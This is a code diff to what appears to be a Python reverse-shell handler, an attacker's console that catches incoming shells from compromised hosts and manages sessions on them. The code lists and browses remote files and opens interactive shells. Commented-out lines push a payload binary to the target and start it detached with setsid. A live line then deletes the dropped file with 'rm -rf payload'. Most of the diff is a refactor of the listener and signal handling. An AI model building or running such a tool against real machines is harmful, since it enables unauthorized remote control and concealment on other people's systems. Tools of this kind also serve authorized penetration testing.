@@ -2,13 +2,14 @@
 
 from modules.utils import send_file, chk_payload, local_shell
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop, pretty, listen, is_alive
+from modules.nethelper import pretty, PyServerSocket, BashServerSocket
 from modules.shell import RawShell
 from threading import Thread
 from modules.commands import ls
 
-import pip._vendor.rich
 import logging
+import signal
+import rich
 import json
 import time
 import sys
@@ -23,9 +24,11 @@ class Shell():
     def __init__(self, socket):
         self.socket = socket
         self.session_type = "bash"
-        self.is_open = True
-        self.is_loop = True
+        self.socket.is_open = True
         self.is_bg = False
+
+class KeyboardBackground(Exception):
+    pass
 
 class NetShell(cmd.Cmd):
     def __init__(self, socket):
@@ -34,39 +37,96 @@ class NetShell(cmd.Cmd):
         self.socket = socket
         self.id = None
         self.output = None
-        self.is_open = True
-        self.is_loop = True
-        self.is_bg = True
         self.shell_active = True
+
+        Thread(target=self.is_alive).start()
+
 
     def default(self, line):
         local_shell(line)
+
+    def emptyline(self):
+        """Called when an empty line is entered in response to the prompt.
+
+        If this method is not overridden, it repeats the last nonempty
+        command entered.
+        """
+        return None
 
     def precmd(self, line):
         """Hook method executed just before the command line is
         interpreted, but after the input prompt is generated and issued.
         """
-        if not self.is_open:
+        if not self.socket.is_open:
             raise BrokenPipeError
         return line
 
     def postcmd(self, stop, line):
         """Hook method executed just after a command dispatch is finished."""
-
         return stop
+
+    # Signal handling
+    def signal_handler(self, sig, frame):
+        """Handle received signals."""
+        if sig == signal.SIGINT:
+            sys.stdout.write("\n")
+            raise KeyboardInterrupt
+        elif sig == signal.SIGTSTP:
+            sys.stdout.write("\n")
+            raise KeyboardBackground
+
+    def cmdloop_with_sigint(self):
+        try:
+            signal.signal(signal.SIGINT, self.signal_handler)
+            signal.signal(signal.SIGTSTP, self.signal_handler)
+            self.cmdloop()
+        except KeyboardInterrupt:
+            self.cmdloop_with_sigint()
+        except KeyboardBackground:
+            an = input("Do you want to background this session? ")
+            if an.lower() == "y":
+                return False
+            elif an.lower() == "n":
+                self.cmdloop_with_sigint()
 
     """
         <--CMD library ends here-->
     """
+
+    def is_alive(self):
+        while self.socket.is_open:
+            try:
+                data = self.socket.send_command("aliv")
+                if len(data) == 0:
+                    raise ConnectionError
+            except (BlockingIOError, AttributeError):
+                # This means the socket is still open but there's no data to receive
+                pass
+            except (ConnectionError, OSError, ValueError):
+                logging.error(f"Session {self.id +1}: Connection lost")
+                self.socket.is_open = False
+                self.socket.client_socket.close()
+                self.socket.server_socket.close()
+                break
+            except Exception as e:
+                logging.error(f"Unexpected exception when checking if a socket is closed: {e}")
+                break
+            time.sleep(1)
 
     """
         <--Commands start here-->
     """
 
     def do_ls(self, line):
-        data = pretty(self.socket.send_command(f"ls {line}"))
-        ls(json.loads(data))
-    
+        try:
+            data = pretty(self.socket.send_command(f"ls {line}"))
+            ls(json.loads(data))
+        except BrokenPipeError:
+            self.do_exit("")
+
+    def do_alive(self, line):
+        print(pretty(self.socket.send_command("aliv")))
+
     def do_send(self, line): # DOES NOT WORK
         check = self.socket.send_command(f"sendingfile {line}")
         if b"ready" in check:
@@ -87,7 +147,8 @@ class NetShell(cmd.Cmd):
 
     def do_shell(self, line):
         self.socket.send_command(f"shell")
-        RawShell(self.socket, pty=True).run()
+        with self.socket.lock:
+            RawShell(self.socket, pty=True).run()
         return
     
     def do_cd(self, line):
@@ -97,8 +158,8 @@ class NetShell(cmd.Cmd):
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
-
-        self.is_loop = False
+        self.is_bg = False
+        self.socket.is_open = False
         self.socket.client_socket.close()
         self.socket.server_socket.close()
         return True
@@ -106,6 +167,10 @@ class NetShell(cmd.Cmd):
 class LocalShell(cmd.Cmd):
     def __init__(self):
         super(LocalShell, self).__init__()
+        # Override cmdloop to handle keyboard interrupts
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTSTP, self.signal_handler)
+
         self.prompt = "local_shell > "
         self.sessions = []
         self.current_session = None
@@ -133,6 +198,22 @@ class LocalShell(cmd.Cmd):
 
         return stop
 
+    # Signal handling
+    def signal_handler(self, sig, frame):
+        """Handle received signals."""
+        if sig == signal.SIGINT:
+            sys.stdout.write("\n")
+            raise KeyboardInterrupt
+        elif sig == signal.SIGTSTP:
+            print("\nCtrl+Z pressed. Type 'exit' to quit.")
+            raise KeyboardInterrupt
+
+    def cmdloop_with_sigint(self):
+        try:
+            self.cmdloop()
+        except (KeyboardInterrupt, BrokenPipeError):
+            self.cmdloop_with_sigint()
+        
     """
         <--Commands start here-->
     """
@@ -167,7 +248,25 @@ class LocalShell(cmd.Cmd):
                 print("Error: Invalid input. Port should be a number.")
                 return
 
-        sock = listen(host, port, 0)
+        sock = BashServerSocket()
+
+        try:
+            sock.server_socket.bind((host, int(port)))
+        except (OSError):
+            logging.error("Address already in use")
+            return
+
+        try:
+            sock.listen()
+            if not sock.is_shell():
+                logging.error("No shell found")
+                return
+        except (KeyboardInterrupt, BrokenPipeError) as e:
+            sock.server_socket.close()
+            if e == BrokenPipeError:
+                logging.error("BrokenPipeError")
+            return
+
         if not sock: return
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
@@ -182,25 +281,46 @@ class LocalShell(cmd.Cmd):
                 # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
                 # time.sleep(1)
                 # test = pretty(sock.send_command("./payload --test"))
-                # print(test)
 
-                # if not test == "Hello world!":
+                # if not test == "Hello world! Wasd":
                 #     logging.error("Thing did not run")
                 #     raise Exception
+
                 # sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
+
                 sock.server_socket.close()
                 sock.client_socket.close()
                 logging.debug(f"Payload sent. Starting listener")
 
-                sock = listen(host, port, 1)
+                sock = PyServerSocket()
+
+                try:
+                    sock.server_socket.bind((host, int(port)))
+                except socket.error:
+                    logging.error("Address already in use")
+                    raise 
+
+                try:
+                    sock.listen()
+                    if not sock.is_shell():
+                        logging.error("No shell found")
+                        return
+                except KeyboardInterrupt:
+                    sock.server_socket.close()
+                    return
+                except BrokenPipeError:
+                    sock.server_socket.close()
+                    logging.error("BrokenPipeError")
+                    return
+
                 if not sock: return
                 sock.send_command("rm -rf payload")
-
                 self.current_session = NetShell(sock)
                 self.current_session.session_type = "python"
             except Exception as e:
                 logging.error(f"Fail to initialize payload. {e}")
                 self.current_session = Shell(sock)
+                self.current_session.session_type = "bash"
         else:
             self.current_session = Shell(sock)
 
@@ -208,15 +328,12 @@ class LocalShell(cmd.Cmd):
         self.current_session.id = (len(self.sessions) - 1)
         logging.info(f"Session {self.current_session.id + 1} created")
         if self.current_session.session_type == "python":
-            # self.current_session.is_bg = True
-            # Thread(target=is_alive, args=[self.current_session]).start() #BUG does not work
-
-            netshell_loop(self.current_session)
+            self.current_session.cmdloop_with_sigint()
+            signal.signal(signal.SIGINT, self.signal_handler)
+            signal.signal(signal.SIGTSTP, self.signal_handler)
         elif self.current_session.session_type == "bash":
             RawShell(self.current_session.socket).run()
-
-            self.current_session.is_bg = True
-            Thread(target=is_alive, args=[self.current_session]).start()
+            Thread(target=self.is_alive, args=[self.current_session]).start()
 
     def do_sessions(self, line):
         args = line.split(" ")
@@ -231,24 +348,22 @@ class LocalShell(cmd.Cmd):
                     logging.error("Sesssion not found")
                     return
             session = self.sessions[index -1]
-            if session.session_type == "python":
-                session.is_bg = False
-                netshell_loop(self.sessions[index -1])
-                # session.is_bg = True
-                # Thread(target=is_alive, args=[session.socket]).start()
+            if not session.socket.is_open:
+                logging.error("Session is closed")
+            elif session.session_type == "python":
+                session.cmdloop_with_sigint()
+                signal.signal(signal.SIGINT, self.signal_handler)
+                signal.signal(signal.SIGTSTP, self.signal_handler)
             elif session.session_type == "bash":
-                session.is_bg = False
                 RawShell(session.socket).run()
-                session.is_bg = True
-                Thread(target=is_alive, args=[session.socket]).start()
                 
             return
 
         for shell in self.sessions:
             # TODO: Format this
             if shell.session_type == "python":
-                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
-                                f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
+                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.server_address} "
+                                f"| Port {shell.socket.server_port} | Open: {shell.socket.is_open}\n")
             elif shell.session_type == "bash":
                 sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
                                 f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
@@ -259,24 +374,13 @@ class LocalShell(cmd.Cmd):
         logging.info("Exiting...")
 
         for netShell in self.sessions:
-            if netShell.is_open:
-                netShell.is_loop = False
+            if netShell.socket.is_open:
+                netShell.is_bg = False
                 netShell.socket.client_socket.close()
                 netShell.socket.server_socket.close()
 
         sys.exit()
 
 
-def _local_loop(localShell):
-    try:
-        localShell.cmdloop()
-    except KeyboardInterrupt:
-        print("")
-        _local_loop(localShell)
-
-def main():
-    _local_loop(LocalShell())
-
-
 if __name__ == "__main__":
-    main()
+    LocalShell().cmdloop_with_sigint()
